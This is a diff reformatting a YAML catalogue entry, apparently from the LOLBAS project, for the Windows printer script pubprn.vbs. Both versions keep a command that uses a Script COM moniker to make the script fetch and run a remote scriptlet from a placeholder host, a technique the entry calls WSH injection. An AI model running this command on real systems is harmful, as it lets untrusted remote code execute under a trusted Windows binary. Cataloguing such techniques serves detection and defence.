@@ -1,26 +1,16 @@
 ---
+name: pubprn.vbs
+description: Used by Windows for printer management
 functions:
   execute:
-    -
-      Name: Pubprn.vbs
-      Description: Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
-          Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection.
-      Full_Path:
-          C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
-          C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
-      Code_Sample:
-          https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSScripts/Payload/Pubprn_calc.sct
-      Detection: |
-          
-      Resources: |
-          https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
-          https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
-          https://github.com/enigma0x3/windows-operating-system-archaeology
-      Notes: Thanks to Matt Nelson - @enigma0x3
+    - description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection.
+      code: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
+resources: 
+    - resource: https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
+    - resource: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
+    - resource: https://github.com/enigma0x3/windows-operating-system-archaeology
+fullpath: 
+    - path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
+    - path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
+notes: Thanks to Matt Nelson - @enigma0x3
 ---
